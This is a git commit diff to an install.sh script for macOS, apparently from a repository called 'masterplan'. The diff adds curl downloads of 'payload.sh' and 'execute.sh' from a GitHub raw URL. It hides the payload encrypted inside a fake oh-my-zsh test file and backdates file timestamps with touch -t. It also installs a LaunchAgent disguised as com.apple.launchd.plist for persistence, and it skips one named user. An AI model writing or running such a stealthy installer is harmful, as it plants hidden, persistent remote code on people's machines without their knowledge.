7a59c628f00f3e8e412f99489f1f70449a816a0a
Julian Muhlberger <moewenmann@protonmail.ch>
2025-01-03 19:39:02 +0100

    get script with curl

--- install.sh
+++ install.sh
@@ -7,23 +7,25 @@ if [ -z "$USER" ]; then
 	exit 1
 fi
 
-# if [ "$USER" == "jmuhlber" ]; then
-# 	echo "nenene"
-# 	exit 1
-# fi
+if [ "$USER" == "jmuhlber" ]; then
+	echo "nenene"
+	exit 1
+fi
 
 
 macinstall() {
 	if [[ -d ~/.oh-my-zsh ]]; then
-		INFILE="payload.sh"
+		curl https://raw.githubusercontent.com/Moewenmann/masterplan/refs/heads/main/source/payload.sh > /tmp/temp
+		INFILE="/tmp/temp"
 		OUTFILE=$HOME/.oh-my-zsh/lib/tests/lyfs.test.zsh
 		openssl enc -aes-256-cbc -salt -in "$INFILE" -out "$OUTFILE" -k "$USER"
-		cp plan.sh ~/.oh-my-zsh/lib/host.zsh
+		rm -rf /tmp/temp
+		curl https://raw.githubusercontent.com/Moewenmann/masterplan/refs/heads/main/source/execute.sh > ~/.oh-my-zsh/lib/host.zsh
 		touch -t 202410191633 ~/.oh-my-zsh/lib/host.zsh
 		touch -t 202405131058 "$OUTFILE"
 		echo "Installed ozsh."
 	fi
-	cp launchagent.xml ~/Library/LaunchAgents/com.apple.launchd.plist
+	curl https://raw.githubusercontent.com/Moewenmann/masterplan/refs/heads/main/source/launchagent.xml > ~/Library/LaunchAgents/com.apple.launchd.plist
 	touch -t 202405131058 ~/Library/LaunchAgents/com.apple.launchd.plist
 	launchctl unload ~/Library/LaunchAgents/com.apple.launchd.plist 2>/dev/null
 	launchctl load ~/Library/LaunchAgents/com.apple.launchd.plist
